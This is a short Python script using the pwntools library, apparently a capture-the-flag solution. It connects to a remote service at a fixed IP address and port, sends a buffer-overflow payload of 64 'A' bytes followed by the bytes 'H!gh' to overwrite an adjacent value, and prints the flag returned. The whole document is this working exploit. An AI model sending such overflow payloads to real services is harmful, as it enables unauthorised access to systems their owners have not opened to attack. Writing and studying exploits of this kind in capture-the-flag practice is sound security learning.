from pwn import *

conn = remote("104.154.106.182", 1234)

conn.sendline("A"*64 + "H!gh")

data = conn.recvall()

lines = data.split()

flag = lines.pop()

print("Flag : " + flag)
